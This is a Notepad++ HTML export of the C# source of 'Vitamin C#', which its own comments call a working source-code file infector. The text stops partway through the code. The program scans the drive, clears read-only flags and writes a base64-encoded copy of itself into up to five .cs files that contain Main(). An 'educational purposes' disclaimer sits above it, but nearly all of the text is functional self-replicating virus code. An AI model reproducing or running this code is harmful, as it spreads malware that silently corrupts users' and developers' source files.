<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
Disclaimer
----------
Everything enclosed within the file is intended only for educational purposes. 
The author assumes that all users understand risks involved within this file and/or its 
attached materials. 

The author won't be responsible for any damages to computer systems arising from the 
misuse of this file and/or its attached materials.
*/</span><span class="sc0">
</span><span class="sc11">ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span><span class="sc0">



</span><span class="sc1">/*
oooooooooooooooooooooooooooooooooooooooo
 Vitamin C# Source Code by linuspauling
oooooooooooooooooooooooooooooooooooooooo

*/</span><span class="sc0">

</span><span class="sc2">//
// This is a very primimitive replicator which uses Microsoft's C# source codes as hosts. 
// It searches for "Main()" within the target and if the conditions are met, it embeds itself
// into it. It BLINDLY assumes that "Main()" is always a valid procedure and will replace the 
// first "Main()" string instance that it finds, then do what it is supposed to do and will 
// terminate after doing so. Because of this, C# sources that has "Main()" inside comments will
// be modified with errors (the code assumes that C# sources that has "Main()" inside comments are 
// an unlikely scenario). It also assumes that the string "using System;" is always present in files
// with a "Main()" routine. It scans the current drive for C# source codes and will only infect 5
// sources in one cycle.
//
// I adapted the routine from a source code that I saw way back. I think it was in VB.NET or Visual 
// Basic 6. I tried to look for it in the Internet so I can tag it as one of my references I wasn't
// successful finding it. So I just relied on what I remember to kind of recreate the routine, but
// now in C#.
//
// Without further ado, take a look at the (working) world's 3rd C# source code file infector.
// (yes. better to declare it the second or the third because there is always someone claiming to be
// the first one who did it.)
//
</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">Sun</span><span class="sc10">.</span><span class="sc11">Microsystems</span><span class="sc10">.</span><span class="sc11">Java</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">namespace</span><span class="sc0"> </span><span class="sc11">INJECT</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">class</span><span class="sc0"> </span><span class="sc11">DllInjectionSample</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">gxzxzxzxz</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">.</span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc11">IsKing</span><span class="sc10">.</span><span class="sc11">LetsGo</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gxzxzxzxz</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">namespace</span><span class="sc0"> </span><span class="sc11">Sun</span><span class="sc10">.</span><span class="sc11">Microsystems</span><span class="sc10">.</span><span class="sc11">Java</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc11">class</span><span class="sc0"> </span><span class="sc11">IsKing</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">counter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">LetsGo</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">xx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetDirectoryName</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">.</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">FullyQualifiedName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">xy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetDirectoryRoot</span><span class="sc10">(</span><span class="sc11">xx</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">@xy</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">yy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AndLetsRock</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">AndLetsRock</span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileInfo</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc6">"*.cs"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileAttributes</span><span class="sc0"> </span><span class="sc11">hh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetAttributes</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hh</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">ReadOnly</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileAttributes</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Normal</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">database</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"bmFtZXNwYWNlIFN1bi5NaWNyb3N5c3RlbXMuSmF2YQ0Kew0KICAgIHB1YmxpYyBjbGFzcyBJc0tpbmcNCiAgICB7DQogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBjb3VudGVyID0gMDsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExldHNHbygpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyB4eCA9IFN5c3RlbS5JTy5QYXRoLkdldERpcmVjdG9yeU5hbWUoU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5HZXRNb2R1bGVzKClbMF0uRnVsbHlRdWFsaWZpZWROYW1lKTsNCiAgICAgICAgICAgIHN0cmluZyB4eSA9IFN5c3RlbS5JTy5EaXJlY3RvcnkuR2V0RGlyZWN0b3J5Um9vdCh4eCk7DQogICAgICAgICAgICBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyBkaXIgPSBuZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oQHh5KTsNCiAgICAgICAgICAgIGludCB5eSA9IEFuZExldHNSb2NrKGRpcik7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgaW50IEFuZExldHNSb2NrKFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvIGQpDQogICAgICAgIHsNCiAgICAgICAgICAgIFN5c3RlbS5JTy5GaWxlSW5mb1tdIGZpbGVzID0gZC5HZXRGaWxlcygiKi5jcyIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkZpbGVJbmZvIGZpbGUgaW4gZmlsZXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbGVuYW1lID0gZmlsZS5GdWxsTmFtZTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMgaGggPSBTeXN0ZW0uSU8uRmlsZS5HZXRBdHRyaWJ1dGVzKGZpbGVuYW1lKTsNCiAgICAgICAgICAgICAgICBpZiAoKGhoICYgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzLlJlYWRPbmx5KSAhPSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzIGF0dHIgPSBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMuTm9ybWFsOw0KICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZS5TZXRBdHRyaWJ1dGVzKGZpbGVuYW1lLCBhdHRyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIGRhdGFiYXNlID0gIg==&gt;IjsNCiAgICAgICAgICAgICAgICBzdHJpbmcgeCA9IFJlYWQoZmlsZW5hbWUpOw0KICAgICAgICAgICAgICAgIGJvb2wgeSA9IFNoYWxsV2UoeCk7DQogICAgICAgICAgICAgICAgYm9vbCB4eXkgPSBTaGFsbFdlSSh4KTsNCiAgICAgICAgICAgICAgICBpZiAoeSA9PSB0cnVlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh4eXkgPT0gdHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGJvb2wgeiA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICh6ID09IHRydWUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudGVyID09IDUpDQogICAgICAgICAgICAgICAgICAgICAgICB7IHJldHVybiAwOyB9DQogICAgICAgICAgICAgICAgICAgICAgICB6ID0gUXVlcnkoZmlsZW5hbWUsIHgsIGRhdGFiYXNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh6ID09IGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ZXIgKz0gMTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIHsgY29udGludWU7IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvW10gZGlycyA9IGQuR2V0RGlyZWN0b3JpZXMoIiouKiIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZGlyIGluIGRpcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5IHsgaW50IHl5eSA9IEFuZExldHNSb2NrKGRpcik7IH0NCiAgICAgICAgICAgICAgICBjYXRjaCB7IGNvbnRpbnVlOyB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gMTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgUmVhZChzdHJpbmcgZmlsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgU3lzdGVtLklPLlN0cmVhbVJlYWRlciBzciA9IFN5c3RlbS5JTy5GaWxlLk9wZW5UZXh0KGZpbGUpOw0KICAgICAgICAgICAgc3RyaW5nIGlucHV0Ow0KICAgICAgICAgICAgc3RyaW5nIGdnID0gIiI7DQogICAgICAgICAgICB3aGlsZSAoKGlucHV0ID0gc3IuUmVhZExpbmUoKSkgIT0gbnVsbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBnZyArPSBpbnB1dCArICJcclxuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHNyLkNsb3NlKCk7DQogICAgICAgICAgICByZXR1cm4gZ2c7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBTaGFsbFdlKHN0cmluZyBzKQ0KICAgICAgICB7DQogICAgICAgICAgICBpbnQgeCA9IHMuVG9Mb3dlcigpLkluZGV4T2YoInN1bi5taWNyb3N5c3RlbXMuamF2YSIpOw0KICAgICAgICAgICAgaWYgKHggPj0gMCkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBTaGFsbFdlSShzdHJpbmcgcykNCiAgICAgICAgew0KICAgICAgICAgICAgaW50IHggPSBzLlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpOw0KICAgICAgICAgICAgaWYgKHggPj0gMCkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBRdWVyeShzdHJpbmcgZmlsZSwgc3RyaW5nIHMsIHN0cmluZyBkYXRhYmFzZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaW50IHggPSBzLlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpOw0KICAgICAgICAgICAgaW50IHl5ID0geDsNCiAgICAgICAgICAgIGNoYXJbXSB4eCA9IHMuVG9DaGFyQXJyYXkoMCwgcy5MZW5ndGggLSAxKTsNCiAgICAgICAgICAgIHdoaWxlICh4eFt5eV0gIT0gJ3snKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHl5ICs9IDE7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzID0gcy5SZXBsYWNlKHMuU3Vic3RyaW5nKHgsICh5eSAtIHgpICsgMSksICJNYWluKHN0cmluZ1tdIGFyZ3MpXHJcblx0e1xyXG5cdFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkIGd4enh6eHp4eiA9IG5ldyBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZChJc0tpbmcuTGV0c0dvKTtcclxuXHRneHp4enh6eHouU3RhcnQoKTsiKTsNCiAgICAgICAgICAgIHMgPSBzLlJlcGxhY2UoInVzaW5nIFN5c3RlbTsiLCAidXNpbmcgU3lzdGVtO1xyXG51c2luZyBTdW4uTWljcm9zeXN0ZW1zLkphdmE7Iik7DQogICAgICAgICAgICB1c2luZyAoU3lzdGVtLklPLlN0cmVhbVdyaXRlciBzdyA9IG5ldyBTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyKGZpbGUpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHQgPSBkYXRhYmFzZS5TcGxpdChuZXcgY2hhcltdIHsgJz4nIH0pOw0KICAgICAgICAgICAgICAgIHN3LldyaXRlTGluZShzKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUoIlxyXG4iKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZShkZWNvZGViNjQodFswXSkrIGRhdGFiYXNlICsgZGVjb2RlYjY0KHRbMV0pKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUoIlxyXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGVjb2RlYjY0KHN0cmluZyBkKQ0KICAgICAgICB7DQogICAgICAgICAgICAgIGJ5dGVbXSBnID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhkKTsNCiAgICAgICAgICAgICAgcmV0dXJuIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKGcpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQo="</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ShallWe</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">xyy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ShallWeI</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xyy</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">counter</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Query</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">database</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">z</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">counter</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">DirectoryInfo</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">dirs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc6">"*.*"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc11">dirs</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">yyy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AndLetsRock</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">sr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">OpenText</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">input</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">gg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">input</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sr</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">gg</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">input</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">sr</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">gg</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">ShallWe</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToLower</span><span class="sc10">().</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"sun.microsystems.java"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">ShallWeI</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToLower</span><span class="sc10">().</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"main("</span><span class="sc10">);</span><span class="sc0">
